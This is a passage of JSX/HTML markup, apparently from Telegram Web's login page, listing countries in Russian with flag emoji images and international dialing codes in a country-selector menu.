                                                                className="country-name">Бонэйр, Синт-Эстатиус и Саба</span><span className="country-code">+599</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1e7-1f1e6.png" className="emoji" alt="🇧🇦"
                                                            data-path="./img-apple-160/1f1e7-1f1e6.png" draggable="false" /></span><span className="country-name">Босния
                                                                и Герцеговина</span><span className="country-code">+387</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1e7-1f1fc.png" className="emoji" alt="🇧🇼"
                                                            data-path="./img-apple-160/1f1e7-1f1fc.png" draggable="false" /></span><span
                                                                className="country-name">Ботсвана</span><span className="country-code">+267</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1e7-1f1f7.png" className="emoji" alt="🇧🇷"
                                                            data-path="./img-apple-160/1f1e7-1f1f7.png" draggable="false" /></span><span
                                                                className="country-name">Бразилия</span><span className="country-code">+55</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1fb-1f1ec.png" className="emoji" alt="🇻🇬"
                                                            data-path="./img-apple-160/1f1fb-1f1ec.png" draggable="false" /></span><span
                                                                className="country-name">Британские Виргинские о-ва</span><span className="country-code">+1284</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1e7-1f1f3.png" className="emoji" alt="🇧🇳"
                                                            data-path="./img-apple-160/1f1e7-1f1f3.png" draggable="false" /></span><span
                                                                className="country-name">Бруней</span><span className="country-code">+673</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1e7-1f1eb.png" className="emoji" alt="🇧🇫"
                                                            data-path="./img-apple-160/1f1e7-1f1eb.png" draggable="false" /></span><span
                                                                className="country-name">Буркина-Фасо</span><span className="country-code">+226</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1e7-1f1ee.png" className="emoji" alt="🇧🇮"
                                                            data-path="./img-apple-160/1f1e7-1f1ee.png" draggable="false" /></span><span
                                                                className="country-name">Бурунди</span><span className="country-code">+257</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1e7-1f1f9.png" className="emoji" alt="🇧🇹"
                                                            data-path="./img-apple-160/1f1e7-1f1f9.png" draggable="false" /></span><span
                                                                className="country-name">Бутан</span><span className="country-code">+975</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1fb-1f1fa.png" className="emoji" alt="🇻🇺"
                                                            data-path="./img-apple-160/1f1fb-1f1fa.png" draggable="false" /></span><span
                                                                className="country-name">Вануату</span><span className="country-code">+678</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1ec-1f1e7.png" className="emoji" alt="🇬🇧"
                                                            data-path="./img-apple-160/1f1ec-1f1e7.png" draggable="false" /></span><span
                                                                className="country-name">Великобритания</span><span className="country-code">+44</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1ed-1f1fa.png" className="emoji" alt="🇭🇺"
                                                            data-path="./img-apple-160/1f1ed-1f1fa.png" draggable="false" /></span><span
                                                                className="country-name">Венгрия</span><span className="country-code">+36</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1fb-1f1ea.png" className="emoji" alt="🇻🇪"
                                                            data-path="./img-apple-160/1f1fb-1f1ea.png" draggable="false" /></span><span
                                                                className="country-name">Венесуэла</span><span className="country-code">+58</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f9-1f1f1.png" className="emoji" alt="🇹🇱"
                                                            data-path="./img-apple-160/1f1f9-1f1f1.png" draggable="false" /></span><span
                                                                className="country-name">Восточный Тимор</span><span className="country-code">+670</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1fb-1f1f3.png" className="emoji" alt="🇻🇳"
                                                            data-path="./img-apple-160/1f1fb-1f1f3.png" draggable="false" /></span><span
                                                                className="country-name">Вьетнам</span><span className="country-code">+84</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1ec-1f1e6.png" className="emoji" alt="🇬🇦"
                                                            data-path="./img-apple-160/1f1ec-1f1e6.png" draggable="false" /></span><span
                                                                className="country-name">Габон</span><span className="country-code">+241</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1ed-1f1f9.png" className="emoji" alt="🇭🇹"
                                                            data-path="./img-apple-160/1f1ed-1f1f9.png" draggable="false" /></span><span
                                                                className="country-name">Гаити</span><span className="country-code">+509</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1ec-1f1fe.png" className="emoji" alt="🇬🇾"
                                                            data-path="./img-apple-160/1f1ec-1f1fe.png" draggable="false" /></span><span
                                                                className="country-name">Гайана</span><span className="country-code">+592</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1ec-1f1f2.png" className="emoji" alt="🇬🇲"
                                                            data-path="./img-apple-160/1f1ec-1f1f2.png" draggable="false" /></span><span
                                                                className="country-name">Гамбия</span><span className="country-code">+220</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1ec-1f1ed.png" className="emoji" alt="🇬🇭"
                                                            data-path="./img-apple-160/1f1ec-1f1ed.png" draggable="false" /></span><span
                                                                className="country-name">Гана</span><span className="country-code">+233</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1ec-1f1f5.png" className="emoji" alt="🇬🇵"
                                                            data-path="./img-apple-160/1f1ec-1f1f5.png" draggable="false" /></span><span
                                                                className="country-name">Гваделупа</span><span className="country-code">+590</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1ec-1f1f9.png" className="emoji" alt="🇬🇹"
                                                            data-path="./img-apple-160/1f1ec-1f1f9.png" draggable="false" /></span><span
                                                                className="country-name">Гватемала</span><span className="country-code">+502</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1ec-1f1eb.png" className="emoji" alt="🇬🇫"
                                                            data-path="./img-apple-160/1f1ec-1f1eb.png" draggable="false" /></span><span
                                                                className="country-name">Гвиана</span><span className="country-code">+594</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1ec-1f1f3.png" className="emoji" alt="🇬🇳"
                                                            data-path="./img-apple-160/1f1ec-1f1f3.png" draggable="false" /></span><span
                                                                className="country-name">Гвинея</span><span className="country-code">+224</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1ec-1f1fc.png" className="emoji" alt="🇬🇼"
                                                            data-path="./img-apple-160/1f1ec-1f1fc.png" draggable="false" /></span><span
                                                                className="country-name">Гвинея-Бисау</span><span className="country-code">+245</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1e9-1f1ea.png" className="emoji" alt="🇩🇪"
                                                            data-path="./img-apple-160/1f1e9-1f1ea.png" draggable="false" /></span><span
                                                                className="country-name">Германия</span><span className="country-code">+49</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1ec-1f1ee.png" className="emoji" alt="🇬🇮"
                                                            data-path="./img-apple-160/1f1ec-1f1ee.png" draggable="false" /></span><span
                                                                className="country-name">Гибралтар</span><span className="country-code">+350</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1ed-1f1f3.png" className="emoji" alt="🇭🇳"
                                                            data-path="./img-apple-160/1f1ed-1f1f3.png" draggable="false" /></span><span
                                                                className="country-name">Гондурас</span><span className="country-code">+504</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1ed-1f1f0.png" className="emoji" alt="🇭🇰"
                                                            data-path="./img-apple-160/1f1ed-1f1f0.png" draggable="false" /></span><span
                                                                className="country-name">Гонконг</span><span className="country-code">+852</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1ec-1f1e9.png" className="emoji" alt="🇬🇩"
                                                            data-path="./img-apple-160/1f1ec-1f1e9.png" draggable="false" /></span><span
                                                                className="country-name">Гренада</span><span className="country-code">+1473</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1ec-1f1f1.png" className="emoji" alt="🇬🇱"
                                                            data-path="./img-apple-160/1f1ec-1f1f1.png" draggable="false" /></span><span
                                                                className="country-name">Гренландия</span><span className="country-code">+299</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1ec-1f1f7.png" className="emoji" alt="🇬🇷"
                                                            data-path="./img-apple-160/1f1ec-1f1f7.png" draggable="false" /></span><span
                                                                className="country-name">Греция</span><span className="country-code">+30</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1ec-1f1ea.png" className="emoji" alt="🇬🇪"
                                                            data-path="./img-apple-160/1f1ec-1f1ea.png" draggable="false" /></span><span
                                                                className="country-name">Грузия</span><span className="country-code">+995</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1ec-1f1fa.png" className="emoji" alt="🇬🇺"
                                                            data-path="./img-apple-160/1f1ec-1f1fa.png" draggable="false" /></span><span
                                                                className="country-name">Гуам</span><span className="country-code">+1671</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1e9-1f1f0.png" className="emoji" alt="🇩🇰"
                                                            data-path="./img-apple-160/1f1e9-1f1f0.png" draggable="false" /></span><span
                                                                className="country-name">Дания</span><span className="country-code">+45</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1e9-1f1ef.png" className="emoji" alt="🇩🇯"
                                                            data-path="./img-apple-160/1f1e9-1f1ef.png" draggable="false" /></span><span
                                                                className="country-name">Джибути</span><span className="country-code">+253</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1ee-1f1f4.png" className="emoji" alt="🇮🇴"
                                                            data-path="./img-apple-160/1f1ee-1f1f4.png" draggable="false" /></span><span
                                                                className="country-name">Диего-Гарсия</span><span className="country-code">+246</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1e9-1f1f2.png" className="emoji" alt="🇩🇲"
                                                            data-path="./img-apple-160/1f1e9-1f1f2.png" draggable="false" /></span><span
                                                                className="country-name">Доминика</span><span className="country-code">+1767</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1e9-1f1f4.png" className="emoji" alt="🇩🇴"
                                                            data-path="./img-apple-160/1f1e9-1f1f4.png" draggable="false" /></span><span
                                                                className="country-name">Доминиканская Республика</span><span className="country-code">+1809</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1e9-1f1f4.png" className="emoji" alt="🇩🇴"
                                                            data-path="./img-apple-160/1f1e9-1f1f4.png" draggable="false" /></span><span
                                                                className="country-name">Доминиканская Республика</span><span className="country-code">+1829</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1e9-1f1f4.png" className="emoji" alt="🇩🇴"
                                                            data-path="./img-apple-160/1f1e9-1f1f4.png" draggable="false" /></span><span
                                                                className="country-name">Доминиканская Республика</span><span className="country-code">+1849</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1ea-1f1ec.png" className="emoji" alt="🇪🇬"
                                                            data-path="./img-apple-160/1f1ea-1f1ec.png" draggable="false" /></span><span
                                                                className="country-name">Египет</span><span className="country-code">+20</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1ff-1f1f2.png" className="emoji" alt="🇿🇲"
                                                            data-path="./img-apple-160/1f1ff-1f1f2.png" draggable="false" /></span><span
                                                                className="country-name">Замбия</span><span className="country-code">+260</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1ff-1f1fc.png" className="emoji" alt="🇿🇼"
                                                            data-path="./img-apple-160/1f1ff-1f1fc.png" draggable="false" /></span><span
                                                                className="country-name">Зимбабве</span><span className="country-code">+263</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1ee-1f1f1.png" className="emoji" alt="🇮🇱"
                                                            data-path="./img-apple-160/1f1ee-1f1f1.png" draggable="false" /></span><span
                                                                className="country-name">Израиль</span><span className="country-code">+972</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1ee-1f1f3.png" className="emoji" alt="🇮🇳"
                                                            data-path="./img-apple-160/1f1ee-1f1f3.png" draggable="false" /></span><span
                                                                className="country-name">Индия</span><span className="country-code">+91</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1ee-1f1e9.png" className="emoji" alt="🇮🇩"
                                                            data-path="./img-apple-160/1f1ee-1f1e9.png" draggable="false" /></span><span
                                                                className="country-name">Индонезия</span><span className="country-code">+62</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1ef-1f1f4.png" className="emoji" alt="🇯🇴"
                                                            data-path="./img-apple-160/1f1ef-1f1f4.png" draggable="false" /></span><span
                                                                className="country-name">Иордания</span><span className="country-code">+962</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1ee-1f1f6.png" className="emoji" alt="🇮🇶"
                                                            data-path="./img-apple-160/1f1ee-1f1f6.png" draggable="false" /></span><span
                                                                className="country-name">Ирак</span><span className="country-code">+964</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1ee-1f1f7.png" className="emoji" alt="🇮🇷"
                                                            data-path="./img-apple-160/1f1ee-1f1f7.png" draggable="false" /></span><span
                                                                className="country-name">Иран</span><span className="country-code">+98</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1ee-1f1ea.png" className="emoji" alt="🇮🇪"
                                                            data-path="./img-apple-160/1f1ee-1f1ea.png" draggable="false" /></span><span
                                                                className="country-name">Ирландия</span><span className="country-code">+353</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1ee-1f1f8.png" className="emoji" alt="🇮🇸"
                                                            data-path="./img-apple-160/1f1ee-1f1f8.png" draggable="false" /></span><span
                                                                className="country-name">Исландия</span><span className="country-code">+354</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1ea-1f1f8.png" className="emoji" alt="🇪🇸"
                                                            data-path="./img-apple-160/1f1ea-1f1f8.png" draggable="false" /></span><span
                                                                className="country-name">Испания</span><span className="country-code">+34</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1ee-1f1f9.png" className="emoji" alt="🇮🇹"
                                                            data-path="./img-apple-160/1f1ee-1f1f9.png" draggable="false" /></span><span
                                                                className="country-name">Италия</span><span className="country-code">+39</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1fe-1f1ea.png" className="emoji" alt="🇾🇪"
                                                            data-path="./img-apple-160/1f1fe-1f1ea.png" draggable="false" /></span><span
                                                                className="country-name">Йемен</span><span className="country-code">+967</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1e8-1f1fb.png" className="emoji" alt="🇨🇻"
                                                            data-path="./img-apple-160/1f1e8-1f1fb.png" draggable="false" /></span><span
                                                                className="country-name">Кабо-Верде</span><span className="country-code">+238</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f0-1f1ff.png" className="emoji" alt="🇰🇿"
                                                            data-path="./img-apple-160/1f1f0-1f1ff.png" draggable="false" /></span><span
                                                                className="country-name">Казахстан</span><span className="country-code">+7</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f0-1f1fe.png" className="emoji" alt="🇰🇾"
                                                            data-path="./img-apple-160/1f1f0-1f1fe.png" draggable="false" /></span><span
                                                                className="country-name">Каймановы острова</span><span className="country-code">+1345</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f0-1f1ed.png" className="emoji" alt="🇰🇭"
                                                            data-path="./img-apple-160/1f1f0-1f1ed.png" draggable="false" /></span><span
                                                                className="country-name">Камбоджа</span><span className="country-code">+855</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1e8-1f1f2.png" className="emoji" alt="🇨🇲"
                                                            data-path="./img-apple-160/1f1e8-1f1f2.png" draggable="false" /></span><span
                                                                className="country-name">Камерун</span><span className="country-code">+237</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1e8-1f1e6.png" className="emoji" alt="🇨🇦"
                                                            data-path="./img-apple-160/1f1e8-1f1e6.png" draggable="false" /></span><span
                                                                className="country-name">Канада</span><span className="country-code">+1</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f6-1f1e6.png" className="emoji" alt="🇶🇦"
                                                            data-path="./img-apple-160/1f1f6-1f1e6.png" draggable="false" /></span><span
                                                                className="country-name">Катар</span><span className="country-code">+974</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f0-1f1ea.png" className="emoji" alt="🇰🇪"
                                                            data-path="./img-apple-160/1f1f0-1f1ea.png" draggable="false" /></span><span
                                                                className="country-name">Кения</span><span className="country-code">+254</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1e8-1f1fe.png" className="emoji" alt="🇨🇾"
                                                            data-path="./img-apple-160/1f1e8-1f1fe.png" draggable="false" /></span><span
                                                                className="country-name">Кипр</span><span className="country-code">+357</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f0-1f1ec.png" className="emoji" alt="🇰🇬"
                                                            data-path="./img-apple-160/1f1f0-1f1ec.png" draggable="false" /></span><span
                                                                className="country-name">Киргизия</span><span className="country-code">+996</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f0-1f1ee.png" className="emoji" alt="🇰🇮"
                                                            data-path="./img-apple-160/1f1f0-1f1ee.png" draggable="false" /></span><span
                                                                className="country-name">Кирибати</span><span className="country-code">+686</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1e8-1f1f3.png" className="emoji" alt="🇨🇳"
                                                            data-path="./img-apple-160/1f1e8-1f1f3.png" draggable="false" /></span><span
                                                                className="country-name">Китай</span><span className="country-code">+86</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1e8-1f1f4.png" className="emoji" alt="🇨🇴"
                                                            data-path="./img-apple-160/1f1e8-1f1f4.png" draggable="false" /></span><span
                                                                className="country-name">Колумбия</span><span className="country-code">+57</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f0-1f1f2.png" className="emoji" alt="🇰🇲"
                                                            data-path="./img-apple-160/1f1f0-1f1f2.png" draggable="false" /></span><span
                                                                className="country-name">Коморы</span><span className="country-code">+269</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1e8-1f1e9.png" className="emoji" alt="🇨🇩"
                                                            data-path="./img-apple-160/1f1e8-1f1e9.png" draggable="false" /></span><span className="country-name">Конго
                                                                (ДРК)</span><span className="country-code">+243</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1e8-1f1ec.png" className="emoji" alt="🇨🇬"
                                                            data-path="./img-apple-160/1f1e8-1f1ec.png" draggable="false" /></span><span className="country-name">Конго
                                                                (Республика)</span><span className="country-code">+242</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1fd-1f1f0.png" className="emoji" alt="🇽🇰"
                                                            data-path="./img-apple-160/1f1fd-1f1f0.png" draggable="false" /></span><span
                                                                className="country-name">Косово</span><span className="country-code">+383</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1e8-1f1f7.png" className="emoji" alt="🇨🇷"
                                                            data-path="./img-apple-160/1f1e8-1f1f7.png" draggable="false" /></span><span
                                                                className="country-name">Коста-Рика</span><span className="country-code">+506</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1e8-1f1ee.png" className="emoji" alt="🇨🇮"
                                                            data-path="./img-apple-160/1f1e8-1f1ee.png" draggable="false" /></span><span
                                                                className="country-name">Кот-д'Ивуар</span><span className="country-code">+225</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1e8-1f1fa.png" className="emoji" alt="🇨🇺"
                                                            data-path="./img-apple-160/1f1e8-1f1fa.png" draggable="false" /></span><span
                                                                className="country-name">Куба</span><span className="country-code">+53</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f0-1f1fc.png" className="emoji" alt="🇰🇼"
                                                            data-path="./img-apple-160/1f1f0-1f1fc.png" draggable="false" /></span><span
                                                                className="country-name">Кувейт</span><span className="country-code">+965</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1e8-1f1fc.png" className="emoji" alt="🇨🇼"
                                                            data-path="./img-apple-160/1f1e8-1f1fc.png" draggable="false" /></span><span
                                                                className="country-name">Кюрасао</span><span className="country-code">+599</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f1-1f1e6.png" className="emoji" alt="🇱🇦"
                                                            data-path="./img-apple-160/1f1f1-1f1e6.png" draggable="false" /></span><span
                                                                className="country-name">Лаос</span><span className="country-code">+856</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f1-1f1fb.png" className="emoji" alt="🇱🇻"
                                                            data-path="./img-apple-160/1f1f1-1f1fb.png" draggable="false" /></span><span
                                                                className="country-name">Латвия</span><span className="country-code">+371</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f1-1f1f8.png" className="emoji" alt="🇱🇸"
                                                            data-path="./img-apple-160/1f1f1-1f1f8.png" draggable="false" /></span><span
                                                                className="country-name">Лесото</span><span className="country-code">+266</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f1-1f1f7.png" className="emoji" alt="🇱🇷"
                                                            data-path="./img-apple-160/1f1f1-1f1f7.png" draggable="false" /></span><span
                                                                className="country-name">Либерия</span><span className="country-code">+231</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f1-1f1e7.png" className="emoji" alt="🇱🇧"
                                                            data-path="./img-apple-160/1f1f1-1f1e7.png" draggable="false" /></span><span
                                                                className="country-name">Ливан</span><span className="country-code">+961</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f1-1f1fe.png" className="emoji" alt="🇱🇾"
                                                            data-path="./img-apple-160/1f1f1-1f1fe.png" draggable="false" /></span><span
                                                                className="country-name">Ливия</span><span className="country-code">+218</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f1-1f1f9.png" className="emoji" alt="🇱🇹"
                                                            data-path="./img-apple-160/1f1f1-1f1f9.png" draggable="false" /></span><span
                                                                className="country-name">Литва</span><span className="country-code">+370</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f1-1f1ee.png" className="emoji" alt="🇱🇮"
                                                            data-path="./img-apple-160/1f1f1-1f1ee.png" draggable="false" /></span><span
                                                                className="country-name">Лихтенштейн</span><span className="country-code">+423</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f1-1f1fa.png" className="emoji" alt="🇱🇺"
                                                            data-path="./img-apple-160/1f1f1-1f1fa.png" draggable="false" /></span><span
                                                                className="country-name">Люксембург</span><span className="country-code">+352</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f2-1f1fa.png" className="emoji" alt="🇲🇺"
                                                            data-path="./img-apple-160/1f1f2-1f1fa.png" draggable="false" /></span><span
                                                                className="country-name">Маврикий</span><span className="country-code">+230</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
